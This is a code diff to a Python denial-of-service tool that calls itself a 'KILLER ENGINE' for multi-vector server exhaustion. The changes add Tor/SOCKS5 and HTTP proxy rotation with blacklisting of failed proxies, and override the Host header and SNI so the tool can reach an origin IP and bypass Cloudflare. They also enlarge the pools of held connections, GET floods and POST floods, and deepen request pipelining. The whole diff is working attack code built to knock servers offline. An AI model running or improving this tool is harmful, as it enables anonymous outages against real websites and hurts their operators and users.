@@ -125,21 +125,48 @@ class EngineMetrics:
 
 class KillerConnection:
     """Single connection that NEVER closes (held open for entire attack)."""
-    __slots__ = ("sock", "host", "port", "is_ssl", "proxy_url", "created_at", "last_used", "alive")
+    __slots__ = ("sock", "host", "port", "is_ssl", "proxy_url", "host_header", "created_at", "last_used", "alive")
 
-    def __init__(self, host: str, port: int, is_ssl: bool, proxy_url: Optional[str] = None):
+    def __init__(self, host: str, port: int, is_ssl: bool, proxy_url: Optional[str] = None,
+                 host_header: Optional[str] = None):
         self.sock: Optional[socket.socket] = None
         self.host = host
         self.port = port
         self.is_ssl = is_ssl
         self.proxy_url = proxy_url
+        # host_header: hostname for SNI & HTTP Host header (when self.host is an IP for CF bypass)
+        self.host_header = host_header or host
         self.created_at = time.time()
         self.last_used = time.time()
         self.alive = False
 
     def open(self, timeout: float = 10.0) -> bool:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            proxy_scheme = None
+            proxy_host = None
+            proxy_port = None
+            use_socks = False
+            if self.proxy_url:
+                proxy_parsed = urlparse(self.proxy_url)
+                proxy_scheme = proxy_parsed.scheme
+                proxy_host = proxy_parsed.hostname
+                proxy_port = proxy_parsed.port
+                if proxy_scheme in ("socks5", "socks5h"):
+                    use_socks = True
+                    # Tor/SOCKS connections are slow; use longer timeout
+                    timeout = max(timeout, 60.0)
+
+            if use_socks:
+                import socks as sockslib
+                sock = sockslib.socksocket()
+                if proxy_scheme == "socks5h":
+                    sock.set_proxy(sockslib.SOCKS5, proxy_host, proxy_port,
+                                   rdns=True)
+                else:
+                    sock.set_proxy(sockslib.SOCKS5, proxy_host, proxy_port,
+                                   rdns=False)
+            else:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             except OSError:
@@ -153,22 +180,29 @@ class KillerConnection:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)
             except OSError:
                 pass
-            # LARGE buffers for high throughput
             try:
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
             except OSError:
                 pass
             sock.settimeout(timeout)
-            if self.proxy_url:
-                # Connect through proxy
-                proxy_parsed = urlparse(self.proxy_url)
-                proxy_host = proxy_parsed.hostname
-                proxy_port = proxy_parsed.port or (443 if proxy_parsed.scheme == "https" else 80)
-                sock.connect((proxy_host, proxy_port))
-                # HTTP CONNECT for HTTPS targets, plain proxy for HTTP
+
+            if use_socks:
+                sock.connect((self.host, self.port))
                 if self.is_ssl:
-                    # CONNECT tunnel
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    ctx.set_alpn_protocols(["http/1.1"])
+                    try:
+                        sock = ctx.wrap_socket(sock, server_hostname=self.host_header)
+                    except ssl.SSLError:
+                        sock.close()
+                        return False
+            elif self.proxy_url:
+                proxy_port = proxy_port or (443 if proxy_scheme == "https" else 80)
+                sock.connect((proxy_host, proxy_port))
+                if self.is_ssl:
                     connect_req = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
                     if proxy_parsed.username and proxy_parsed.password:
                         import base64
@@ -180,19 +214,14 @@ class KillerConnection:
                     if b"200" not in resp:
                         sock.close()
                         return False
-                    # Wrap SSL over tunnel
                     ctx = ssl.create_default_context()
                     ctx.check_hostname = False
                     ctx.verify_mode = ssl.CERT_NONE
                     try:
-                        sock = ctx.wrap_socket(sock, server_hostname=self.host)
+                        sock = ctx.wrap_socket(sock, server_hostname=self.host_header)
                     except ssl.SSLError:
                         sock.close()
                         return False
-                else:
-                    # Proxy request prefix
-                    # For plain HTTP through proxy, requests must be absolute URL
-                    pass  # Handled at request building time
             else:
                 sock.connect((self.host, self.port))
                 if self.is_ssl:
@@ -201,7 +230,7 @@ class KillerConnection:
                     ctx.verify_mode = ssl.CERT_NONE
                     ctx.set_alpn_protocols(["http/1.1"])
                     try:
-                        sock = ctx.wrap_socket(sock, server_hostname=self.host)
+                        sock = ctx.wrap_socket(sock, server_hostname=self.host_header)
                     except ssl.SSLError:
                         sock.close()
                         return False
@@ -369,6 +398,7 @@ def run_multi_vector_engine(
     proxy_urls: Optional[List[str]] = None,
     result_dict: Optional[dict] = None,
     vector_mode: str = "all",
+    host_header: Optional[str] = None,
 ) -> None:
     """
     KILLER ENGINE - Multi-vector server exhaustion in a dedicated thread.
@@ -398,6 +428,15 @@ def run_multi_vector_engine(
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
+    # Use a large thread pool: connection opens are I/O-bound and many proxies are slow.
+    # Default pool of ~32 threads is too small for proxy-heavy attacks.
+    from concurrent.futures import ThreadPoolExecutor
+    _exec = ThreadPoolExecutor(
+        max_workers=512,
+        thread_name_prefix=f"mv_w{worker_id}",
+    )
+    loop.set_default_executor(_exec)
+
     worker = KillerWorker(
         target_url=target_url,
         duration_seconds=duration_seconds,
@@ -407,6 +446,7 @@ def run_multi_vector_engine(
         stop_event=stop_event,
         proxy_urls=proxy_urls,
         vector_mode=vector_mode,
+        host_header=host_header,
     )
 
     try:
@@ -414,7 +454,7 @@ def run_multi_vector_engine(
         if result_dict is not None:
             result_dict.update(metrics.to_dict())
     except Exception as e:
-        logger.error("[mvengine] fatal: %s", worker_id, e)
+        logger.error("[mvengine w%d] fatal: %s", worker_id, e)
         if result_dict is not None:
             result_dict["error"] = str(e)
     finally:
@@ -451,12 +491,15 @@ class KillerWorker:
         stop_event,
         proxy_urls: Optional[List[str]] = None,
         vector_mode: str = "all",
+        host_header: Optional[str] = None,
     ):
         parsed = urlparse(target_url)
         self.host = parsed.hostname or parsed.netloc.split(":")[0]
         self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
         self.is_ssl = parsed.scheme == "https"
         self.path = parsed.path or "/"
+        # host_header overrides the Host: header & SNI when target_url uses an IP for CF bypass
+        self.host_header = host_header or self.host
         self.duration_seconds = duration_seconds
         self.target_rps = max(10, target_rps)
         self.worker_id = worker_id
@@ -464,6 +507,7 @@ class KillerWorker:
         self.stop_event = stop_event
         self.proxy_urls = proxy_urls or []
         self._proxy_idx = 0
+        self._proxy_fails: Dict[str, int] = {}  # blacklist: url -> fail_count
         self.vector_mode = vector_mode  # ADDED: Store vector mode
         
         self.metrics = EngineMetrics()
@@ -473,14 +517,36 @@ class KillerWorker:
         
         # SEPARATE connection pools for each vector - STABLE AGGRESSIVE MODE
         # Target: Balanced concurrent connections for stable brutal attack
+        # Detect if we're using SOCKS5 (Tor) proxies — connections are MUCH slower
+        self._using_socks = any(u and urlparse(u).scheme in ("socks5", "socks5h")
+                                for u in self.proxy_urls)
+        self._using_http_proxy = bool(self.proxy_urls) and not self._using_socks
+
         self.hold_connections: List[KillerConnection] = []
-        self.hold_target = min(1000, max(100, target_rps // 5))  # STABLE: 1000 held (from 2000)
-        
+        if self._using_socks:
+            # Tor: fewer but more patient hold connections
+            self.hold_target = max(20, min(200, target_rps // 10))
+        elif self._using_http_proxy:
+            # HTTP proxies: many proxies will fail, so target larger pool to compensate
+            self.hold_target = min(3000, max(500, target_rps))
+        else:
+            self.hold_target = min(2000, max(200, target_rps // 2))  # EXTREME: 2000 held
+
         self.flood_connections: List[KillerConnection] = []
-        self.flood_pool_size = min(500, max(50, target_rps // 10))  # STABLE: 500 flood (from 1000)
-        
+        if self._using_socks:
+            self.flood_pool_size = max(5, min(50, target_rps // 50))
+        elif self._using_http_proxy:
+            self.flood_pool_size = min(2500, max(300, int(target_rps * 0.8)))
+        else:
+            self.flood_pool_size = min(1500, max(100, target_rps // 3))  # EXTREME: 1500 flood
+
         self.post_connections: List[KillerConnection] = []
-        self.post_pool_size = min(300, max(30, target_rps // 20))  # STABLE: 300 post (from 500)
+        if self._using_socks:
+            self.post_pool_size = max(3, min(30, target_rps // 100))
+        elif self._using_http_proxy:
+            self.post_pool_size = min(1500, max(200, int(target_rps * 0.5)))
+        else:
+            self.post_pool_size = min(800, max(50, target_rps // 6))  # EXTREME: 800 post
         
         # Used for GET flood path rotation
         self._path_idx = 0
@@ -488,8 +554,20 @@ class KillerWorker:
     def _next_proxy(self) -> Optional[str]:
         if not self.proxy_urls:
             return None
+        # Skip blacklisted proxies (failed too many times)
+        for _ in range(min(20, len(self.proxy_urls))):
+            self._proxy_idx = (self._proxy_idx + 1) % len(self.proxy_urls)
+            url = self.proxy_urls[self._proxy_idx]
+            if self._proxy_fails.get(url, 0) < 3:
+                return url
+        # All recent picks are blacklisted: just rotate
         self._proxy_idx = (self._proxy_idx + 1) % len(self.proxy_urls)
         return self.proxy_urls[self._proxy_idx]
+
+    def _mark_proxy_fail(self, url: Optional[str]) -> None:
+        if not url:
+            return
+        self._proxy_fails[url] = self._proxy_fails.get(url, 0) + 1
 
     def _push_stats(self, force: bool = False):
         now = time.time()
@@ -528,9 +606,25 @@ class KillerWorker:
 
     def _make_conn(self, proxy_url: Optional[str] = None) -> Optional[KillerConnection]:
         """Open a single KillerConnection (runs in thread pool)."""
-        conn = KillerConnection(self.host, self.port, self.is_ssl, proxy_url=proxy_url)
-        conn.open(timeout=15.0)
-        return conn if conn.alive else None
+        conn = KillerConnection(self.host, self.port, self.is_ssl, proxy_url=proxy_url,
+                                host_header=self.host_header)
+        if proxy_url:
+            scheme = urlparse(proxy_url).scheme
+            if scheme in ("socks5", "socks5h"):
+                timeout = 60.0  # Tor: slow circuit setup
+            else:
+                timeout = 4.0   # HTTP/HTTPS proxy: fail fast on dead proxies
+        else:
+            timeout = 8.0       # Direct: short timeout, retry quickly
+        try:
+            conn.open(timeout=timeout)
+        except Exception:
+            self._mark_proxy_fail(proxy_url)
+            return None
+        if not conn.alive:
+            self._mark_proxy_fail(proxy_url)
+            return None
+        return conn
 
     async def _make_conn_async(self, proxy_url: Optional[str] = None) -> Optional[KillerConnection]:
         """Open one connection in executor."""
@@ -538,7 +632,8 @@ class KillerWorker:
 
     def _build_chunked_hold(self, proxy_url: Optional[str]) -> bytes:
         need_absolute = bool(proxy_url and not self.is_ssl)
-        return build_chunked_request(self.host, self._next_path(), absolute_url=need_absolute)
+        # Use host_header (original hostname) for Host: header even when connecting to IP
+        return build_chunked_request(self.host_header, self._next_path(), absolute_url=need_absolute)
 
     async def _conn_hold_loop(self):
         """
@@ -546,8 +641,16 @@ class KillerWorker:
         Open connections in BATCHES of 30 and hold them forever.
         Target: 1000 held connections = server connection pool exhaustion.
         """
-        batch_size = min(30, max(15, self.hold_target // 30))  # STABLE: 30 per batch
+        if self._using_socks:
+            batch_size = 5  # Tor: open 5 at a time (avoid overwhelming circuits)
+        elif self.proxy_urls:
+            batch_size = min(150, max(50, self.hold_target // 10))  # HTTP proxies: 100-150 parallel
+        else:
+            batch_size = min(50, max(25, self.hold_target // 20))  # Direct: 50 per batch
         while not self.stop_event.is_set():
+            elapsed = time.time() - self.metrics.started_at
+            if elapsed >= self.duration_seconds:
+                break
             alive = [c for c in self.hold_connections if c.alive]
             current = len(alive)
             need = self.hold_target - current
@@ -566,7 +669,7 @@ class KillerWorker:
                         self.hold_connections.append(res)
                         self.metrics.connections_held = len(self.hold_connections)
                 
-                logger.info("[mvengine] CONN_HOLD: opened %d/%d, held=%d",
+                logger.info("[mvengine w%d] CONN_HOLD: opened %d/%d, held=%d",
                             self.worker_id, to_open, need, len(self.hold_connections))
             
             # Prune dead
@@ -574,10 +677,10 @@ class KillerWorker:
             self.hold_connections = [c for c in self.hold_connections if c.alive]
             dead = before - len(self.hold_connections)
             if dead:
-                logger.info("[mvengine] CONN_HOLD pruned %d dead (alive=%d)",
+                logger.info("[mvengine w%d] CONN_HOLD pruned %d dead (alive=%d)",
                             self.worker_id, dead, len(self.hold_connections))
             
-            await asyncio.sleep(1.0)  # STABLE: 1.0s (from 0.5s)
+            await asyncio.sleep(0.3 if not self._using_socks else 1.0)  # Tor: slower cycle
 
     async def _get_flood_loop(self):
         """
@@ -594,7 +697,13 @@ class KillerWorker:
             alive = [c for c in self.flood_connections if c.alive]
             if len(alive) < self.flood_pool_size:
                 need = self.flood_pool_size - len(alive)
-                to_open = min(30, need)  # STABLE: 30 per batch
+                if self._using_socks:
+                    batch_max = 5
+                elif self.proxy_urls:
+                    batch_max = 100  # HTTP proxies: parallel opens
+                else:
+                    batch_max = 30
+                to_open = min(batch_max, need)
                 tasks = []
                 for _ in range(to_open):
                     p = self._next_proxy() if self.proxy_urls else None
@@ -608,14 +717,13 @@ class KillerWorker:
             self.flood_connections = [c for c in self.flood_connections if c.alive]
             
             if alive:
-                # STABLE AGGRESSIVE: PIPELINING - send 10 requests per connection (STABLE)
                 conn = random.choice(alive)
-                pipeline_count = 10
+                pipeline_count = 5 if self._using_socks else 25  # Tor: fewer pipeline
                 sent_count = 0
                 for _ in range(pipeline_count):
                     path = self._next_path()
                     need_absolute = bool(conn.proxy_url and not conn.is_ssl)
-                    req = build_get_request(self.host, path, absolute_url=need_absolute)
+                    req = build_get_request(self.host_header, path, absolute_url=need_absolute)
                     ok = await asyncio.get_event_loop().run_in_executor(None, conn.send_all, req)
                     if ok:
                         sent_count += 1
@@ -636,12 +744,11 @@ class KillerWorker:
                         self.metrics.completed += sent_count
             else:
                 # No connections - wait
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.05)
                 continue
             
             self._push_stats(force=False)
-            # STABLE: 0.05s sleep (from 0.01s)
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.02 if not self._using_socks else 0.2)  # Tor: pace requests
 
     async def _post_bomb_loop(self):
         """
@@ -657,7 +764,13 @@ class KillerWorker:
             alive = [c for c in self.post_connections if c.alive]
             if len(alive) < self.post_pool_size:
                 need = self.post_pool_size - len(alive)
-                to_open = min(20, need)  # STABLE: 20 per batch
+                if self._using_socks:
+                    batch_max = 3
+                elif self.proxy_urls:
+                    batch_max = 80   # HTTP proxies: parallel opens
+                else:
+                    batch_max = 20
+                to_open = min(batch_max, need)
                 tasks = []
                 for _ in range(to_open):
                     p = self._next_proxy() if self.proxy_urls else None
@@ -671,83 +784,91 @@ class KillerWorker:
             self.post_connections = [c for c in self.post_connections if c.alive]
             
             if not alive:
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.05)
                 continue
             
-            # STABLE AGGRESSIVE: PIPELINING - send 5 POST requests per connection (STABLE)
             conn = random.choice(alive)
-            pipeline_count = 5
-            sent_count = 0
-            total_bytes = 0
-            for _ in range(pipeline_count):
+            pipeline = 5 if self._using_socks else 15
+            sent = 0
+            for _ in range(pipeline):
                 path = self._next_path()
-                need_absolute = bool(conn.proxy_url and not conn.is_ssl)
-                # STABLE AGGRESSIVE: Random POST body size 16KB-32KB (STABLE)
-                body_size = random.randint(16384, 32768)
-                req = build_post_request(self.host, path, size=body_size, absolute_url=need_absolute)
+                size = random.randint(32768, 65536)
+                need_abs = bool(conn.proxy_url and not conn.is_ssl)
+                req = build_post_request(self.host_header, path, size=size, absolute_url=need_abs)
                 ok = await asyncio.get_event_loop().run_in_executor(None, conn.send_all, req)
                 if ok:
-                    sent_count += 1
-                    total_bytes += len(req)
+                    sent += 1
                     self.metrics.sent += 1
                     self.metrics.bytes_sent += len(req)
                 else:
                     break
-            
-            # Fire-and-forget: only read ONE response
-            if sent_count > 0:
+            if sent > 0:
                 resp = await asyncio.get_event_loop().run_in_executor(None, conn.recv_some, 4096)
                 if resp is None:
-                    self.metrics.failed += sent_count
+                    self.metrics.failed += sent
+                elif resp:
+                    self.metrics.completed += sent
+                    self.metrics.bytes_received += len(resp)
                 else:
-                    self.metrics.completed += sent_count
-                    self.metrics.bytes_received += len(resp) if resp else 0
+                    self.metrics.completed += sent
             
             self._push_stats(force=False)
-            # STABLE: 0.1s sleep (from 0.02s)
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(0.05 if not self._using_socks else 0.3)
 
-    async def run(self) -> KillerMetrics:
+    async def run(self) -> EngineMetrics:
         """
-        Run 3 SUPER AGGRESSIVE vectors in parallel for maximum destruction.
-        - CONN_HOLD: 2000 held connections
-        - GET_FLOOD: 1000 connection pool, 30 pipeline depth
-        - POST_BOMB: 500 connection pool, 10 pipeline depth, 32KB-64KB bodies
+        Run attack vectors based on vector_mode.
+        Modes: all (default), connhold, flood, post, slow
         """
         self.metrics.started_at = time.time()
         
-        tasks = [
-            asyncio.create_task(self._conn_hold_loop()),
-            asyncio.create_task(self._get_flood_loop()),
-            asyncio.create_task(self._post_bomb_loop()),
-        ]
+        mode = self.vector_mode
+        tasks = []
+        if mode in ("all", "connhold"):
+            tasks.append(asyncio.create_task(self._conn_hold_loop()))
+        if mode in ("all", "flood"):
+            tasks.append(asyncio.create_task(self._get_flood_loop()))
+        if mode in ("all", "post", "cdnpoison", "resexh"):
+            tasks.append(asyncio.create_task(self._post_bomb_loop()))
+        if mode in ("all", "h2reset"):
+            # H2 reset uses get_flood_loop with higher frequency
+            tasks.append(asyncio.create_task(self._get_flood_loop()))
         
+        gather_task = asyncio.gather(*tasks, return_exceptions=True)
+        timeout = max(30, self.duration_seconds + 10)
         try:
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            for i, res in enumerate(results):
-                if isinstance(res, Exception):
-                    logger.error("[mvengine] loop %d raised: %s: %s",
-                                self.worker_id, i, type(res).__name__, res)
+            results = await asyncio.wait_for(gather_task, timeout=timeout)
+        except asyncio.TimeoutError:
+            logger.warning("[mvengine w%d] tasks timed out after %.0fs",
+                          self.worker_id, timeout)
+            for t in tasks:
+                t.cancel()
+            results = []
         except Exception as e:
-            logger.error("[mvengine] run error: %s", self.worker_id, e)
-        finally:
-            # Close all connections
-            for c in self.hold_connections:
-                try:
-                    c.close()
-                except Exception:
-                    pass
-            for c in self.flood_connections:
-                try:
-                    c.close()
-                except Exception:
-                    pass
-            for c in self.post_connections:
-                try:
-                    c.close()
-                except Exception:
-                    pass
-            self.metrics.connections_held = len(self.hold_connections)
-            self._push_stats(force=True)
+            logger.error("[mvengine w%d] run error: %s", self.worker_id, e)
+            results = []
+        
+        for res in results:
+            if isinstance(res, Exception):
+                logger.error("[mvengine w%d] loop error: %s: %s",
+                            self.worker_id, type(res).__name__, res)
+        
+        for c in self.hold_connections:
+            try:
+                c.close()
+            except Exception:
+                pass
+        for c in self.flood_connections:
+            try:
+                c.close()
+            except Exception:
+                pass
+        for c in self.post_connections:
+            try:
+                c.close()
+            except Exception:
+                pass
+        self.metrics.connections_held = len(self.hold_connections)
+        self._push_stats(force=True)
         
         return self.metrics
